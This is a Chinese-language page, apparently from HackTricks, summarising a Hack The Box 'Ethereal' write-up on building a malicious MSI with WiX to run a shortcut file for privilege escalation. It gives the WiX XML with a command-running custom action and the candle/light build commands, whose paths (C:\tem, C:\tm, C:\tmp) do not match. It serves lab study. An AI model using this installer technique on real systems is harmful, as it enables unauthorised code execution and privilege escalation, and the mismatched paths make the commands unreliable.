# 创建恶意 MSI 并获取 Root 权限

{{#include ../../banners/hacktricks-training.md}}

MSI installer 的创建将使用 wixtools，具体来说会使用 [wixtools](http://wixtoolset.org)。值得一提的是，我们也尝试过其他 MSI builder，但在这种特定情况下均未成功。<sup>[[1]](#references)</sup>

如需全面了解 wix MSI 的使用示例，建议参考[此页面](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)。其中包含多个演示 wix MSI 用法的示例。<sup>[[2]](#references)</sup>

目标是生成一个能够执行 lnk file 的 MSI。为实现这一目标，可以使用以下 XML code（[xml from here](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)）：<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
需要注意的是，Package 元素包含 InstallerVersion 和 Compressed 等属性，分别用于指定安装程序的版本以及指示软件包是否经过压缩。

创建过程需要使用 wixtools 中的 candle.exe 工具，根据 msi.xml 生成 wixobject。应执行以下命令：<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
此外，值得一提的是，帖子中提供了一张展示该命令及其输出结果的图片。你可以参考它以获得直观指导。<sup>[[1]](#references)</sup>

此外，还将使用 wixtools 中的另一个工具 light.exe，根据 wixobject 创建 MSI 文件。要执行的命令如下：<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
与上一条命令类似，文章中包含一张图片，用于展示该命令及其输出。<sup>[[1]](#references)</sup>

请注意，尽管此摘要旨在提供有价值的信息，但建议参考原始文章，以获取更全面的详情和准确的操作说明。<sup>[[1]](#references)</sup>

## 参考资料

- [1] [Hack The Box - Ethereal：创建恶意 msi 并获取 root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [快速介绍：使用 WiX 创建 MSI 安装程序 - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)（另请参阅 [wixtools](http://wixtoolset.org)）

{{#include ../../banners/hacktricks-training.md}}
